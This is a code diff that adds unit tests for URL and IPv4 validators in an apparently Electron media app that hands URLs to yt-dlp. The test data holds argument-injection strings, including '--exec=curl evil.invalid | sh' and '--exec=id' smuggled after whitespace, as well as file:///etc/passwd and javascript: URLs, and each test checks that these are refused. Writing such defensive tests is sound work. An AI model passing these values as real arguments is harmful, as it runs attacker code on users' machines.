@@ -9,7 +9,7 @@ const assert = require('assert');
 const fs = require('fs');
 const os = require('os');
 const path = require('path');
-const { localMediaPath, readTextCapped, containedPath } = require('../src/main/ipc-validate');
+const { localMediaPath, readTextCapped, containedPath, httpUrl, ipv4 } = require('../src/main/ipc-validate');
 
 const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'spritz-validate-'));
 const realFile = path.join(tmp, 'Movie.mkv');
@@ -100,5 +100,45 @@ test('containedPath fails closed on the root itself and bad input', () => {
   for (const [r, x] of [[null, 'a'], ['/tmp', null], ['', 'a'], ['/tmp', ''], [42, 'a'],
     ['/tmp', 'a\0b']]) {
     assert.strictEqual(containedPath(r, x), null);
+  }
+});
+
+// --- httpUrl: this string becomes an argv entry for yt-dlp ---
+
+test('httpUrl accepts real web addresses', () => {
+  assert.strictEqual(httpUrl('https://youtube.com/watch?v=abc'), 'https://youtube.com/watch?v=abc');
+  assert.strictEqual(httpUrl('http://example.com/'), 'http://example.com/');
+});
+
+test('httpUrl refuses anything that would arrive as a yt-dlp option', () => {
+  // yt-dlp's --exec runs a command and --config-location loads a config that can carry one, so a
+  // leading '-' is not a malformed URL, it is an instruction.
+  for (const bad of ['--exec=curl evil.invalid | sh', '--config-location=/tmp/evil.conf',
+    '-o/tmp/anywhere', '--paths=/tmp', '-', '--']) {
+    assert.strictEqual(httpUrl(bad), null, bad + ' must be refused');
+  }
+});
+
+test('httpUrl refuses non-http schemes and malformed input', () => {
+  for (const bad of ['file:///etc/passwd', 'javascript:alert(1)', 'data:text/html,x',
+    'magnet:?xt=urn:btih:abc', 'ftp://x/y', 'http://', 'not a url', '', null, undefined, 42, {}]) {
+    assert.strictEqual(httpUrl(bad), null, JSON.stringify(bad) + ' must be refused');
+  }
+});
+
+test('httpUrl refuses whitespace and absurd lengths', () => {
+  assert.strictEqual(httpUrl('https://x.invalid/ --exec=id'), null, 'whitespace splits arguments');
+  assert.strictEqual(httpUrl('https://x.invalid/\n--exec=id'), null);
+  assert.strictEqual(httpUrl('https://x.invalid/' + 'a'.repeat(3000)), null);
+});
+
+// --- ipv4: host values that reach a command line ---
+
+test('ipv4 accepts dotted quads and refuses everything else', () => {
+  assert.strictEqual(ipv4('192.168.1.42'), '192.168.1.42');
+  assert.strictEqual(ipv4('10.0.0.1'), '10.0.0.1');
+  for (const bad of ['-x', '--flag', '192.168.1.256', '192.168.1', '192.168.01.1',
+    '192.168.1.1 -x', 'tv.local', '0x7f.0.0.1', '::1', '', null, 42]) {
+    assert.strictEqual(ipv4(bad), null, JSON.stringify(bad) + ' must be refused');
   }
 });
